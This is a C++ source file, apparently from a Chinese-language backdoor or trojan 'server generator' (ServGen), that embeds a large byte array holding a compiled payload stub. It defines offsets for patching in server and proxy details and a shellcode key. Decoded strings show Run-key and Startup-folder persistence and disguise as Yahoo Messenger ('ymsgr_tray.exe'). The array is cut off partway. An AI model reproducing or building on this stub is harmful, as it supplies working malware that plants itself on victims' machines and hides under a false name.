// Page3.cpp : 实现文件
//
#include "stdafx.h"
#include "ServGen.h"
#include "Page3.h"
#include "ReadmeDlg.h"
#include ".\..\Common\xsEncrypt.h"
#include ".\..\Common\common.h"

#define SVC_OFFSET_SERVER_INFO	0xC8F0
#define SVC_OFFSET_PROXY_INFO	0xCB50

#define SVC_OFFSET_SHELLCODE	0xCBE8
#define SVC_OFFSET_KEY			0xCB40

#define SVC_SHELLCODE_KEY	"nscvj09343"

unsigned char dataSvc[3854] = {
	0xB8, 0x8C, 0x19, 0x40, 0x00, 0xE8, 0x5A, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFB, 0xF0, 
	0xBF, 0x5F, 0x97, 0x0F, 0x2C, 0x38, 0x2E, 0xCF, 0x8F, 0x66, 0x8E, 0xDA, 0xFD, 0xE2, 0x1F, 0xBB, 
	0x31, 0xCF, 0x9E, 0x33, 0x69, 0xB7, 0xFE, 0xE5, 0x19, 0x0E, 0x58, 0x3F, 0x15, 0x5A, 0x4D, 0xA1, 
	0xB8, 0x13, 0x45, 0x49, 0x87, 0x74, 0xEF, 0xBF, 0xFA, 0x41, 0xC1, 0x53, 0x22, 0xAC, 0x19, 0x87, 
	0xD8, 0x1C, 0x19, 0x2E, 0xB5, 0xAE, 0x59, 0x06, 0xA6, 0xF5, 0x0D, 0x32, 0xA1, 0x6F, 0x78, 0x56, 
	0xA6, 0x29, 0x51, 0xF4, 0x08, 0x7F, 0x60, 0xC4, 0x43, 0xE6, 0x00, 0x00, 0x00, 0x00, 0xA1, 0x70, 
	0xAD, 0xF4, 0x59, 0x61, 0x53, 0x44, 0xE1, 0xB9, 0xFC, 0xF0, 0xF4, 0x8E, 0x92, 0xAC, 0x9E, 0x06, 
	0x8E, 0xFE, 0xB9, 0x15, 0x51, 0x91, 0x88, 0xF8, 0xA2, 0x55, 0xAA, 0x8E, 0x4F, 0xFB, 0xF0, 0xBE, 
	0x41, 0x42, 0x00, 0x00, 0x00, 0x00, 0x07, 0x76, 0x02, 0x04, 0xB0, 0x76, 0x6E, 0xFC, 0x08, 0x75, 
	0x5B, 0xB6, 0x00, 0x00, 0x00, 0x00, 0x5C, 0x97, 0x4A, 0x07, 0x14, 0xD1, 0x95, 0x6B, 0x16, 0x21, 
	0x65, 0x86, 0xEA, 0x72, 0x58, 0x34, 0x02, 0x37, 0x6B, 0x73, 0xFE, 0xFF, 0xFF, 0xFF, 0xE8, 0xF7, 
	0xFE, 0xFF, 0xFF, 0x61, 0x62, 0x63, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x43, 0x3A, 0x5C, 0x44, 0x6F, 0x63, 0x75, 0x6D, 0x65, 
	0x6E, 0x74, 0x73, 0x20, 0x61, 0x6E, 0x64, 0x20, 0x53, 0x65, 0x74, 0x74, 0x69, 0x6E, 0x67, 0x73, 
	0x5C, 0x41, 0x64, 0x6D, 0x69, 0x6E, 0x69, 0x73, 0x74, 0x72, 0x61, 0x74, 0x6F, 0x72, 0x5C, 0xD7, 
	0xC0, 0xC3, 0xE6, 0x5C, 0x69, 0x6E, 0x6A, 0x65, 0x63, 0x74, 0x5F, 0x61, 0x62, 0x63, 0x5F, 0x31, 
	0x35, 0x2E, 0x65, 0x78, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x2F, 0x10, 0xE1, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x1B, 0x41, 0xEF, 0xFF, 
	0xFF, 0xFF, 0xFF, 0x40, 0xF5, 0xDF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x10, 0x24, 0x70, 0x80, 0xEC, 
	0x27, 0xA0, 0x81, 0x28, 0x1C, 0x41, 0xEF, 0x00, 0x00, 0x00, 0x00, 0x22, 0x24, 0x70, 0x80, 0x08, 
	0x00, 0x00, 0x00, 0x46, 0x02, 0x00, 0x00, 0xD8, 0x2B, 0x4E, 0x80, 0xC0, 0x26, 0xA0, 0x81, 0x50, 
	0x26, 0xA0, 0x81, 0x0E, 0x2C, 0x4E, 0x80, 0x5C, 0xCF, 0x92, 0x7C, 0x32, 0x9B, 0x80, 0x7C, 0xFF, 
	0xFF, 0xFF, 0xFF, 0x80, 0xFF, 0x9E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0xFF, 0x9E, 0x00, 0x00, 
	0x10, 0x00, 0x00, 0x49, 0x9B, 0x80, 0x7C, 0x18, 0x19, 0x1A, 0x1B, 0x0C, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xFF, 0x9E, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0xDC, 0xFF, 0x9E, 0x00, 0xC0, 0x9A, 0x83, 0x7C, 0x50, 0x9B, 0x80, 0x7C, 0xFF, 
	0xFF, 0xFF, 0xFF, 0x49, 0x9B, 0x80, 0x7C, 0x09, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0x91, 
	0xAE, 0x40, 0x00, 0x9A, 0xAE, 0x40, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0xB4, 
	0xFF, 0x9E, 0x00, 0xBD, 0x12, 0x40, 0x00, 0x38, 0xAF, 0x40, 0x00, 0x01, 0x02, 0x02, 0x00, 0x00, 
	0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0x32, 0x37, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x31, 0x3A, 0x38, 
	0x30, 0x38, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x25, 0x55, 0x53, 0x45, 0x52, 0x50, 0x52, 
	0x4F, 0x46, 0x49, 0x4C, 0x45, 0x25, 0x5C, 0x41, 0x70, 0x70, 0x6C, 0x69, 0x63, 0x61, 0x74, 0x69, 
	0x6F, 0x6E, 0x20, 0x44, 0x61, 0x74, 0x61, 0x00, 0x59, 0x61, 0x68, 0x6F, 0x6F, 0x21, 0x00, 0x79, 
	0x6D, 0x73, 0x67, 0x72, 0x5F, 0x74, 0x72, 0x61, 0x79, 0x2E, 0x65, 0x78, 0x65, 0x00, 0x48, 0x54, 
	0x54, 0x50, 0x2F, 0x31, 0x2E, 0x30, 0x00, 0x53, 0x6F, 0x66, 0x74, 0x77, 0x61, 0x72, 0x65, 0x5C, 
	0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x5C, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 
	0x73, 0x5C, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 
	0x5C, 0x45, 0x78, 0x70, 0x6C, 0x6F, 0x72, 0x65, 0x72, 0x5C, 0x55, 0x73, 0x65, 0x72, 0x20, 0x53, 
	0x68, 0x65, 0x6C, 0x6C, 0x20, 0x46, 0x6F, 0x6C, 0x64, 0x65, 0x72, 0x73, 0x00, 0x53, 0x6F, 0x66, 
	0x74, 0x77, 0x61, 0x72, 0x65, 0x5C, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x5C, 
	0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x5C, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x56, 
	0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x5C, 0x52, 0x75, 0x6E, 0x00, 0x59, 0x61, 0x68, 0x6F, 0x6F, 
	0x21, 0x00, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x00, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 
	0x6F, 0x66, 0x74, 0x00, 0x55, 0x8B, 0xEC, 0x81, 0xC4, 0x24, 0xF9, 0xFF, 0xFF, 0xE8, 0x8F, 0x07, 
	0x00, 0x00, 0x89, 0x45, 0xFC, 0x8D, 0x75, 0x04, 0xAD, 0x89, 0x85, 0xD4, 0xFE, 0xFF, 0xFF, 0x8B, 
	0xB5, 0xD4, 0xFE, 0xFF, 0xFF, 0x83, 0xC6, 0x04, 0x8D, 0x7D, 0xF8, 0xFC, 0xAD, 0x83, 0xF8, 0x00, 
	0x74, 0x0D, 0x50, 0xFF, 0x75, 0xFC, 0xE8, 0xC2, 0x07, 0x00, 0x00, 0xFD, 0xAB, 0xEB, 0xEC, 0x56, 
	0xE8, 0x08, 0x00, 0x00, 0x00, 0x77, 0x69, 0x6E, 0x69, 0x6E, 0x65, 0x74, 0x00, 0xFF, 0x55, 0xF8, 
	0x89, 0x45, 0xAC, 0x5E, 0x8D, 0x7D, 0xA8, 0xFC, 0xAD, 0x83, 0xF8, 0x00, 0x74, 0x0D, 0x50, 0xFF, 
	0x75, 0xAC, 0xE8, 0x96, 0x07, 0x00, 0x00, 0xFD, 0xAB, 0xEB, 0xEC, 0x56, 0xE8, 0x06, 0x00, 0x00, 
	0x00, 0x6E, 0x74, 0x64, 0x6C, 0x6C, 0x00, 0xFF, 0x55, 0xF8, 0x89, 0x45, 0x84, 0x5E, 0x8D, 0x7D, 
	0x80, 0xFC, 0xAD, 0x83, 0xF8, 0x00, 0x74, 0x0D, 0x50, 0xFF, 0x75, 0x84, 0xE8, 0x6C, 0x07, 0x00, 
	0x00, 0xFD, 0xAB, 0xEB, 0xEC, 0x56, 0xE8, 0x09, 0x00, 0x00, 0x00, 0x61, 0x64, 0x76, 0x61, 0x70, 
	0x69, 0x33, 0x32, 0x00, 0xFF, 0x55, 0xF8, 0x89, 0x85, 0x74, 0xFF, 0xFF, 0xFF, 0x5E, 0x8D, 0xBD, 
	0x70, 0xFF, 0xFF, 0xFF, 0xFC, 0xAD, 0x83, 0xF8, 0xFE, 0x74, 0x10, 0x50, 0xFF, 0xB5, 0x74, 0xFF, 
	0xFF, 0xFF, 0xE8, 0x36, 0x07, 0x00, 0x00, 0xFD, 0xAB, 0xEB, 0xE9, 0x6A, 0x0B, 0xFF, 0x55, 0xE0, 
	0xB9, 0x98, 0x00, 0x00, 0x00, 0xBE, 0x29, 0x18, 0x40, 0x00, 0x81, 0xEE, 0x32, 0x15, 0x40, 0x00, 
	0x03, 0xB5, 0xD4, 0xFE, 0xFF, 0xFF, 0x8D, 0xBD, 0x24, 0xF9, 0xFF, 0xFF, 0xF3, 0xA4, 0xB9, 0x4E, 
	0x02, 0x00, 0x00, 0xBE, 0xDB, 0x15, 0x40, 0x00, 0x81, 0xEE, 0x32, 0x15, 0x40, 0x00, 0x03, 0xB5, 
	0xD4, 0xFE, 0xFF, 0xFF, 0x8D, 0xBD, 0xBE, 0xF9, 0xFF, 0xFF, 0xF3, 0xA4, 0x8D, 0xBD, 0x24, 0xF9, 
	0xFF, 0xFF, 0x89, 0xBD, 0x04, 0xFC, 0xFF, 0xFF, 0xB8, 0xDB, 0x15, 0x40, 0x00, 0x2D, 0x32, 0x15, 
	0x40, 0x00, 0x03, 0x85, 0xD4, 0xFE, 0xFF, 0xFF, 0x8B, 0xF0, 0x8D, 0xBD, 0xBE, 0xF9, 0xFF, 0xFF, 
	0x6A, 0x20, 0x56, 0x57, 0xFF, 0x55, 0x80, 0xB8, 0xF6, 0x18, 0x40, 0x00, 0x2D, 0x32, 0x15, 0x40, 
	0x00, 0x03, 0x85, 0xD4, 0xFE, 0xFF, 0xFF, 0x6A, 0x09, 0x50, 0x8D, 0xBD, 0x3C, 0xFF, 0xFF, 0xFF, 
	0x57, 0xFF, 0x55, 0x80, 0x8A, 0x85, 0xE6, 0xFA, 0xFF, 0xFF, 0x24, 0x01, 0x84, 0xC0, 0x0F, 0x84, 
	0xE7, 0x01, 0x00, 0x00, 0x68, 0x04, 0x01, 0x00, 0x00, 0x8D, 0xBD, 0x0C, 0xFC, 0xFF, 0xFF, 0x57, 
	0xFF, 0x55, 0xB0, 0x8D, 0xBD, 0x0C, 0xFC, 0xFF, 0xFF, 0x03, 0xF8, 0xC6, 0x07, 0x5C, 0x47, 0xC6, 
	0x07, 0x00, 0xBE, 0xE7, 0x18, 0x40, 0x00, 0x81, 0xEE, 0x32, 0x15, 0x40, 0x00, 0x03, 0xB5, 0xD4, 
	0xFE, 0xFF, 0xFF, 0x8D, 0xBD, 0x0C, 0xFC, 0xFF, 0xFF, 0x56, 0x57, 0xE8, 0xEB, 0x08, 0x00, 0x00, 
	0x68, 0x80, 0x00, 0x00, 0x00, 0x8D, 0x85, 0x0C, 0xFC, 0xFF, 0xFF, 0x50, 0xFF, 0x55, 0xC0, 0xBA, 
	0xFF, 0x15, 0x40, 0x00, 0x81, 0xEA, 0x32, 0x15, 0x40, 0x00, 0x03, 0x95, 0xD4, 0xFE, 0xFF, 0xFF, 
	0x6A, 0x00, 0x8D, 0x85, 0x0C, 0xFC, 0xFF, 0xFF, 0x50, 0x52, 0xFF, 0x55, 0xCC, 0x85, 0xC0, 0x0F, 
	0x85, 0xCA, 0x00, 0x00, 0x00, 0xB8, 0xC1, 0x18, 0x40, 0x00, 0x2D, 0x32, 0x15, 0x40, 0x00, 0x03, 
	0x85, 0xD4, 0xFE, 0xFF, 0xFF, 0x6A, 0x64, 0x50, 0x8D, 0xBD, 0x10, 0xFD, 0xFF, 0xFF, 0x57, 0xFF, 
	0x55, 0x80, 0x68, 0x04, 0x01, 0x00, 0x00, 0x8D, 0xB5, 0x0C, 0xFC, 0xFF, 0xFF, 0x56, 0x57, 0xFF, 
	0x55, 0xD4, 0x8D, 0xBC, 0x28, 0x0B, 0xFC, 0xFF, 0xFF, 0xC6, 0x07, 0x5C, 0xC6, 0x47, 0x01, 0x00, 
	0x8D, 0xBD, 0x0C, 0xFC, 0xFF, 0xFF, 0xBE, 0xE0, 0x18, 0x40, 0x00, 0x81, 0xEE, 0x32, 0x15, 0x40, 
	0x00, 0x03, 0xB5, 0xD4, 0xFE, 0xFF, 0xFF, 0x56, 0x57, 0xE8, 0x5D, 0x08, 0x00, 0x00, 0x6A, 0x00, 
	0x8D, 0xBD, 0x0C, 0xFC, 0xFF, 0xFF, 0x57, 0xFF, 0x55, 0xD0, 0x8D, 0xB5, 0x0C, 0xFC, 0xFF, 0xFF, 
	0x56, 0xE8, 0x31, 0x08, 0x00, 0x00, 0x8D, 0xBC, 0x28, 0x0C, 0xFC, 0xFF, 0xFF, 0xC6, 0x07, 0x5C, 
	0xC6, 0x47, 0x01, 0x00, 0x8D, 0xBD, 0x0C, 0xFC, 0xFF, 0xFF, 0xBE, 0xE7, 0x18, 0x40, 0x00, 0x81, 
	0xEE, 0x32, 0x15, 0x40, 0x00, 0x03, 0xB5, 0xD4, 0xFE, 0xFF, 0xFF, 0x56, 0x57, 0xE8, 0x19, 0x08, 
	0x00, 0x00, 0x68, 0x80, 0x00, 0x00, 0x00, 0x8D, 0x85, 0x0C, 0xFC, 0xFF, 0xFF, 0x50, 0xFF, 0x55, 
	0xC0, 0xBA, 0xFF, 0x15, 0x40, 0x00, 0x81, 0xEA, 0x32, 0x15, 0x40, 0x00, 0x03, 0x95, 0xD4, 0xFE, 
	0xFF, 0xFF, 0x6A, 0x00, 0x8D, 0x85, 0x0C, 0xFC, 0xFF, 0xFF, 0x50, 0x52, 0xFF, 0x55, 0xCC, 0x8D, 
	0xB5, 0x0C, 0xFC, 0xFF, 0xFF, 0x8D, 0xBD, 0xF0, 0xFA, 0xFF, 0xFF, 0xB9, 0x04, 0x01, 0x00, 0x00, 
	0xF3, 0xA4, 0x8D, 0xB5, 0xE7, 0xFA, 0xFF, 0xFF, 0xAC, 0x83, 0xF8, 0x00, 0x0F, 0x84, 0xE0, 0x01, 
	0x00, 0x00, 0x83, 0xF8, 0x02, 0x0F, 0x84, 0xB1, 0x00, 0x00, 0x00, 0x8D, 0xB5, 0x0C, 0xFC, 0xFF, 
	0xFF, 0x8D, 0xBD, 0x62, 0xFD, 0xFF, 0xFF, 0xB9, 0x04, 0x01, 0x00, 0x00, 0xF3, 0xA4, 0x8D, 0x35, 
	0x7A, 0x19, 0x40, 0x00, 0x81, 0xEE, 0x32, 0x15, 0x40, 0x00, 0x03, 0xB5, 0xD4, 0xFE, 0xFF, 0xFF, 
	0x8D, 0xBD, 0x58, 0xFD, 0xFF, 0xFF, 0xB9, 0x08, 0x00, 0x00, 0x00, 0xF3, 0xA4, 0xB8, 0xFF, 0x18, 
	0x40, 0x00, 0x2D, 0x32, 0x15, 0x40, 0x00, 0x03, 0x85, 0xD4, 0xFE, 0xFF, 0xFF, 0x8B, 0xF0, 0x8D, 
	0xBD, 0x66, 0xFE, 0xFF, 0xFF, 0xB9, 0x64, 0x00, 0x00, 0x00, 0xF3, 0xA4, 0x8D, 0x85, 0x54, 0xFD, 
	0xFF, 0xFF, 0x50, 0x68, 0x06, 0x00, 0x02, 0x00, 0x6A, 0x00, 0x8D, 0xBD, 0x66, 0xFE, 0xFF, 0xFF, 
	0x57, 0x68, 0x01, 0x00, 0x00, 0x80, 0xFF, 0x95, 0x70, 0xFF, 0xFF, 0xFF, 0x8D, 0xB5, 0x62, 0xFD, 
	0xFF, 0xFF, 0x33, 0xC9, 0xAC, 0x41, 0x84, 0xC0, 0x75, 0xFA, 0xFD, 0xAC, 0x49, 0x3C, 0x5C, 0x75, 
	0xFA, 0xC6, 0x46, 0x01, 0x00, 0x41, 0x41, 0xFC, 0x51, 0x8D, 0xBD, 0x62, 0xFD, 0xFF, 0xFF, 0x57, 
	0x6A, 0x02, 0x6A, 0x00, 0x8D, 0xBD, 0x58, 0xFD, 0xFF, 0xFF, 0x57, 0xFF, 0xB5, 0x54, 0xFD, 0xFF, 
	0xFF, 0xFF, 0x95, 0x64, 0xFF, 0xFF, 0xFF, 0xE9, 0x26, 0x01, 0x00, 0x00, 0xB8, 0x45, 0x19, 0x40, 
	0x00, 0x2D, 0x32, 0x15, 0x40, 0x00, 0x03, 0x85, 0xD4, 0xFE, 0xFF, 0xFF, 0x8B, 0xF0, 0x8D, 0xBD, 
	0x66, 0xFE, 0xFF, 0xFF, 0xB9, 0x64, 0x00, 0x00, 0x00, 0xF3, 0xA4, 0x8D, 0x85, 0x54, 0xFD, 0xFF, 
	0xFF, 0x50, 0x68, 0x06, 0x00, 0x02, 0x00, 0x6A, 0x00, 0x8D, 0xBD, 0x66, 0xFE, 0xFF, 0xFF, 0x57, 
	0x68, 0x01, 0x00, 0x00, 0x80, 0xFF, 0x95, 0x70, 0xFF, 0xFF, 0xFF, 0x8D, 0x85, 0x50, 0xFD, 0xFF, 
	0xFF, 0x50, 0x68, 0x06, 0x00, 0x02, 0x00, 0x6A, 0x00, 0x8D, 0xBD, 0x66, 0xFE, 0xFF, 0xFF, 0x57, 
	0x68, 0x02, 0x00, 0x00, 0x80, 0xFF, 0x95, 0x70, 0xFF, 0xFF, 0xFF, 0xB9, 0x64, 0x00, 0x00, 0x00, 
	0xF3, 0xA4, 0x8D, 0xBD, 0x62, 0xFD, 0xFF, 0xFF, 0xC6, 0x07, 0x22, 0x47, 0x8D, 0xB5, 0x0C, 0xFC, 
	0xFF, 0xFF, 0xAC, 0x84, 0xC0, 0x74, 0x03, 0xAA, 0xEB, 0xF8, 0xC6, 0x07, 0x22, 0xC6, 0x47, 0x01, 
	0x20, 0xC6, 0x47, 0x02, 0x2D, 0xC6, 0x47, 0x03, 0x6C, 0xC6, 0x47, 0x04, 0x6F, 0xC6, 0x47, 0x05, 
	0x63, 0xC6, 0x47, 0x06, 0x61, 0xC6, 0x47, 0x07, 0x6C, 0xC6, 0x47, 0x08, 0x00, 0x8D, 0x35, 0x73, 
	0x19, 0x40, 0x00, 0x81, 0xEE, 0x32, 0x15, 0x40, 0x00, 0x03, 0xB5, 0xD4, 0xFE, 0xFF, 0xFF, 0x8D, 
	0xBD, 0x58, 0xFD, 0xFF, 0xFF, 0xB9, 0x0A, 0x00, 0x00, 0x00, 0xF3, 0xA4, 0x8D, 0xB5, 0x58, 0xFD, 
	0xFF, 0xFF, 0x8D, 0xBD, 0xF4, 0xFB, 0xFF, 0xFF, 0xB9, 0x0A, 0x00, 0x00, 0x00, 0xF3, 0xA4, 0x8D, 
	0xB5, 0x62, 0xFD, 0xFF, 0xFF, 0x33, 0xC9, 0xAC, 0x41, 0x84, 0xC0, 0x75, 0xFA, 0x49, 0x51, 0x51, 
	0x8D, 0xBD, 0x62, 0xFD, 0xFF, 0xFF, 0x57, 0x6A, 0x01, 0x6A, 0x00, 0x8D, 0xBD, 0x58, 0xFD, 0xFF, 
	0xFF, 0x57, 0xFF, 0xB5, 0x50, 0xFD, 0xFF, 0xFF, 0xFF, 0x95, 0x64, 0xFF, 0xFF, 0xFF, 0x59, 0x85, 
	0xC0, 0x74, 0x1F, 0x51, 0x8D, 0xBD, 0x62, 0xFD, 0xFF, 0xFF, 0x57, 0x6A, 0x01, 0x6A, 0x00, 0x8D, 
	0xBD, 0x58, 0xFD, 0xFF, 0xFF, 0x57, 0xFF, 0xB5, 0x54, 0xFD, 0xFF, 0xFF, 0xFF, 0x95, 0x64, 0xFF, 
	0xFF, 0xFF, 0x68, 0x2F, 0x57, 0x45, 0x42, 0x68, 0x41, 0x4E, 0x39, 0x35, 0x68, 0x4E, 0x4F, 0x4B, 
	0x49, 0x8D, 0xBD, 0xFC, 0xFE, 0xFF, 0xFF, 0xB9, 0x03, 0x00, 0x00, 0x00, 0x8F, 0x07, 0x83, 0xC7, 
	0x04, 0xE2, 0xF9, 0x8B, 0x85, 0xE8, 0xFA, 0xFF, 0xFF, 0x57, 0x50, 0xE8, 0x72, 0x05, 0x00, 0x00, 
	0x47, 0xC6, 0x07, 0x2E, 0x47, 0x8B, 0x85, 0xEC, 0xFA, 0xFF, 0xFF, 0x57, 0x50, 0xE8, 0x60, 0x05, 
	0x00, 0x00, 0x47, 0xC6, 0x07, 0x00, 0x33, 0xC0, 0x6A, 0x00, 0x6A, 0x00, 0x8D, 0x95, 0x28, 0xF9, 
	0xFF, 0xFF, 0x52, 0xFF, 0xB5, 0x24, 0xF9, 0xFF, 0xFF, 0x8D, 0x95, 0xFC, 0xFE, 0xFF, 0xFF, 0x52, 
	0xFF, 0x55, 0xA8, 0x85, 0xC0, 0x0F, 0x84, 0x8B, 0x02, 0x00, 0x00, 0x89, 0x85, 0x5C, 0xFF, 0xFF, 
	0xFF, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x03, 0x6A, 0x00, 0x6A, 0x00, 0x8B, 0x9D, 0xDE, 0xF9, 0xFF, 
	0xFF, 0x53, 0x8D, 0xBD, 0xBE, 0xF9, 0xFF, 0xFF, 0x57, 0x50, 0xFF, 0x55, 0xA4, 0x83, 0xF8, 0x00, 
	0x0F, 0x84, 0x60, 0x02, 0x00, 0x00, 0x89, 0x85, 0x58, 0xFF, 0xFF, 0xFF, 0x6A, 0x00, 0x68, 0x00, 
	0x00, 0x80, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x8D, 0xBD, 0x3C, 0xFF, 0xFF, 0xFF, 0x57, 0x6A, 0x00, 
	0x6A, 0x00, 0x50, 0xFF, 0x55, 0xA0, 0x83, 0xF8, 0x00, 0x0F, 0x84, 0x37, 0x02, 0x00, 0x00, 0x89, 
	0x85, 0x54, 0xFF, 0xFF, 0xFF, 0x68, 0x60, 0xEA, 0x00, 0x00, 0x8F, 0x85, 0x50, 0xFF, 0xFF, 0xFF, 
	0x6A, 0x04, 0x8D, 0xBD, 0x50, 0xFF, 0xFF, 0xFF, 0x57, 0x6A, 0x06, 0x50, 0xFF, 0x55, 0x9C, 0x8B, 
	0x85, 0x24, 0xF9, 0xFF, 0xFF, 0x83, 0xF8, 0x03, 0x75, 0x34, 0x8D, 0x95, 0x4C, 0xF9, 0xFF, 0xFF, 
	0x52, 0xE8, 0xE1, 0x04, 0x00, 0x00, 0x40, 0x50, 0x52, 0x6A, 0x2B, 0xFF, 0xB5, 0x54, 0xFF, 0xFF, 
	0xFF, 0xFF, 0x55, 0x9C, 0x8D, 0x95, 0x6C, 0xF9, 0xFF, 0xFF, 0x52, 0xE8, 0xC7, 0x04, 0x00, 0x00, 
	0x40, 0x50, 0x52, 0x6A, 0x2C, 0xFF, 0xB5, 0x54, 0xFF, 0xFF, 0xFF, 0xFF, 0x55, 0x9C, 0xC7, 0x85, 
	0x48, 0xFF, 0xFF, 0xFF, 0x04, 0x00, 0x00, 0x00, 0x8D, 0x95, 0x48, 0xFF, 0xFF, 0xFF, 0x52, 0x8D, 
	0x95, 0x4C, 0xFF, 0xFF, 0xFF, 0x52, 0x6A, 0x1F, 0xFF, 0xB5, 0x54, 0xFF, 0xFF, 0xFF, 0xFF, 0x55, 
	0x98, 0x81, 0x8D, 0x4C, 0xFF, 0xFF, 0xFF, 0x00, 0x01, 0x00, 0x00, 0x81, 0x8D, 0x4C, 0xFF, 0xFF, 
	0xFF, 0x00, 0x10, 0x00, 0x00, 0x81, 0x8D, 0x4C, 0xFF, 0xFF, 0xFF, 0x80, 0x00, 0x00, 0x00, 0x81, 
